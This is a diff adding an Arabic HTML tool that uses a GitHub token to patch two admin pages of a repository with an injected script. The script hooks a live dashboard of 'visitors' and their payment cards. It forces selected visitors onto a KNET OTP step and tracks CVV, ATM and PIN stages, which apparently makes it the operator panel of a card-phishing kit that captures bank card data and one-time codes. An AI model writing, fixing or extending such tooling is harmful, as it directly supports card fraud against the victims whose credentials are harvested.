@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FIX98B — إصلاح وسم الإغلاق</title>
+<style>
+body{font-family:Tahoma,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:16px}
+.wrap{max-width:860px;margin:0 auto}
+h1{font-size:19px;margin:0 0 6px}
+.sub{color:#94a3b8;font-size:13px;margin:0 0 14px}
+.card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:14px;margin-bottom:12px}
+label{display:block;font-size:12px;color:#94a3b8;margin-bottom:4px}
+input{width:100%;box-sizing:border-box;padding:9px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;font-family:monospace;font-size:13px}
+button{width:100%;padding:14px;border:0;border-radius:10px;background:#16a34a;color:#fff;font-size:17px;font-weight:bold;cursor:pointer;margin-top:10px}
+button:disabled{background:#475569}
+.row{display:flex;gap:8px;margin-top:8px}
+.row>div{flex:1}
+#log{background:#020617;border:1px solid #334155;border-radius:10px;padding:10px;font-family:monospace;font-size:12px;white-space:pre-wrap;min-height:90px;direction:ltr;text-align:left}
+.ok{color:#4ade80}.bad{color:#f87171}.info{color:#7dd3fc}.warn{color:#fbbf24}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>FIX98B — إصلاح وسم الإغلاق الناقص</h1>
+  <p class="sub">يصلّح: server/admin/index.html · kdd-public/admin.html</p>
+  <div class="card">
+    <label>توكن GitHub (ghp_...)</label>
+    <input id="tok" placeholder="ghp_...">
+    <div class="row">
+      <div><label>المالك</label><input id="own" value="fahshomi-ui"></div>
+      <div><label>المستودع</label><input id="rep" value="KDD"></div>
+      <div><label>الفرع</label><input id="br" value="main"></div>
+    </div>
+    <button id="go">تطبيق الإصلاح</button>
+  </div>
+  <div class="card"><div id="log">جاهز…</div></div>
+</div>
+<script>
+(function(){
+  var $ = function(id){ return document.getElementById(id); };
+  try { var t = localStorage.getItem('kdd_token'); if (t) $('tok').value = t; } catch(e){}
+  function log(msg, cls){
+    var el = $('log');
+    el.innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
+    el.scrollTop = el.scrollHeight;
+  }
+  var b64e = function(s){ return btoa(unescape(encodeURIComponent(s))); };
+  var b64d = function(s){ return decodeURIComponent(escape(atob(String(s).replace(/\s/g,'')))); };
+
+  var OPEN = '<script id="kddF98">';
+  var CLOSE = '<\/script>';
+
+  var BLOCK = `<script id="kddF98">
+(function(){
+  if (window.__f98) return; window.__f98 = 1;
+  var LBL = 'رمز التحقق كي نت (OTP)';
+  var lock = {};
+  function findV(id){
+    var v = null;
+    try { v = visitors.get(id); } catch(e){}
+    if (!v) { try { visitors.forEach(function(x){ if (!v && x && x._id === id) v = x; }); } catch(e){} }
+    return v || null;
+  }
+  function knetish(v){
+    if (!v) return false;
+    var p = String(v.page || '');
+    if (/كي\\s*نت|knet/i.test(p) && !/otp|رمز/i.test(p)) return true;
+    try { return (v.paymentCards || []).some(function(c){ return c && c.paymentMethod === 'KNET'; }); } catch(e){ return false; }
+  }
+  try {
+    var sp = window.shortenPage;
+    if (typeof sp === 'function' && !sp.__f98) {
+      var w = function(page){
+        var p = String(page || '').toLowerCase();
+        if (p.indexOf('otp') > -1 || p.indexOf('رمز') > -1) return '🔢 OTP كي نت';
+        return sp.call(this, page);
+      };
+      w.__f98 = 1; window.shortenPage = w; try { shortenPage = w; } catch(e){}
+    }
+  } catch(e){}
+  var oOTP = window.cardActionOTP;
+  window.cardActionOTP = function(btn, sid){
+    var v = null; try { v = visitors.get(selectedVisitorId); } catch(e){}
+    var k = knetish(v);
+    var r = (typeof oOTP === 'function') ? oOTP.apply(this, arguments) : undefined;
+    if (k && v && v._id) {
+      lock[v._id] = Date.now();
+      try { v.page = LBL; } catch(e){}
+      try { renderVisitorsList(); } catch(e){}
+      try { if (selectedVisitorId === v._id) renderVisitorDetails(v); } catch(e){}
+    }
+    return r;
+  };
+  var oREJ = window.cardActionReject;
+  window.cardActionReject = function(btn, sid){
+    var v = null; try { v = visitors.get(selectedVisitorId); } catch(e){}
+    var r = (typeof oREJ === 'function') ? oREJ.apply(this, arguments) : undefined;
+    if (v && v._id && lock[v._id]) {
+      delete lock[v._id];
+      try { v.page = 'دفع كي نت'; } catch(e){}
+      try { renderVisitorsList(); } catch(e){}
+    }
+    return r;
+  };
+  function enforce(){
+    var now = Date.now(), changed = false, selCh = false;
+    Object.keys(lock).forEach(function(id){
+      if (now - lock[id] > 1800000) { delete lock[id]; return; }
+      var v = findV(id);
+      if (!v) return;
+      var p = String(v.page || '');
+      if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(p)) { delete lock[id]; changed = true; return; }
+      if (p !== LBL) { v.page = LBL; changed = true; if (id === selectedVisitorId) selCh = true; }
+    });
+    if (changed) {
+      try { renderVisitorsList(); } catch(e){}
+      if (selCh) { try { var sv = findV(selectedVisitorId); if (sv) renderVisitorDetails(sv); } catch(e){} }
+    }
+  }
+  function hook(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f98) return;
+      s.__f98 = 1;
+      s.on('visitors:update', function(){ enforce(); });
+      s.on('visitor:pageChanged', function(){ enforce(); });
+    } catch(e){}
+  }
+  hook(); setInterval(hook, 400); setInterval(enforce, 700);
+})();
+<\/script>`;
+
+  var FILES = [ 'server/admin/index.html', 'kdd-public/admin.html' ];
+
+  function repair(txt){
+    var i = txt.indexOf(OPEN);
+    if (i === -1) {
+      var anchor = CLOSE + '\n</body>\n</html>';
+      if (txt.indexOf(anchor) === -1) return { st:'fail', why:'ما لقيت كتلة FIX98 ولا نهاية الملف' };
+      return { st:'insert', txt: txt.replace(anchor, CLOSE + '\n' + BLOCK + '\n</body>\n</html>') };
+    }
+    var before = txt.slice(0, i);
+    var j = txt.indexOf(CLOSE, i);
+    if (j === -1) return { st:'fail', why:'ما لقيت نهاية الكتلة' };
+    var end = j + CLOSE.length;
+    if (/<\/script>\s*$/.test(before.slice(-40))) return { st:'ok' };
+    var out = before.replace(/\s*$/, '\n') + CLOSE + '\n' + txt.slice(i, end) + txt.slice(end).replace(/^\s*/, '\n');
+    return { st:'fix', txt: out };
+  }
+
+  function api(path, opt){
+    var base = 'https://api.github.com/repos/' + encodeURIComponent($('own').value.trim()) + '/' + encodeURIComponent($('rep').value.trim());
+    return fetch(base + '/contents/' + path, opt).then(function(r){
+      if (!r.ok) return r.text().then(function(t){ throw new Error(r.status + ' ' + t.slice(0,160)); });
+      return r.json();
+    });
+  }
+
+  $('go').addEventListener('click', function(){
+    var tok = $('tok').value.trim();
+    var br  = $('br').value.trim() || 'main';
+    if (!tok) { log('✗ حط التوكن أول', 'bad'); return; }
+    try { localStorage.setItem('kdd_token', tok); } catch(e){}
+    $('go').disabled = true;
+    $('log').innerHTML = '';
+    var mods = 0, fails = 0, oks = 0;
+
+    (function next(i){
+      if (i >= FILES.length) {
+        log('—— انتهى ——', 'info');
+        log('نتيجة: ' + mods + ' مُصلّح · ' + oks + ' سليم مسبقاً · ' + fails + ' فشل', mods ? 'ok' : 'warn');
+        $('go').disabled = false;
+        return;
+      }
+      var path = FILES[i];
+      log('… قراءة ' + path, 'info');
+      var hdr = { headers: { 'Authorization': 'token ' + tok, 'Accept': 'application/vnd.github+json' } };
+      api(path + '?ref=' + encodeURIComponent(br), hdr).then(function(j){
+        var res = repair(b64d(j.content));
+        if (res.st === 'fail') { log('✗ ' + path + ' — ' + res.why, 'bad'); fails++; return next(i+1); }
+        if (res.st === 'ok')   { log('↺ ' + path + ' — سليم أصلاً', 'warn'); oks++; return next(i+1); }
+        return api(path, {
+          method: 'PUT',
+          headers: { 'Authorization': 'token ' + tok, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message: 'FIX98B — إصلاح وسم الإغلاق', content: b64e(res.txt), sha: j.sha, branch: br })
+        }).then(function(){
+          log('✓ تم الإصلاح: ' + path + (res.st === 'insert' ? ' (إدراج جديد)' : ''), 'ok');
+          mods++;
+          next(i+1);
+        });
+      }).catch(function(e){
+        log('✗ ' + path + ' → ' + e.message, 'bad');
+        fails++;
+        next(i+1);
+      });
+    })(0);
+  });
+})();
+</script>
+</body>
+</html>
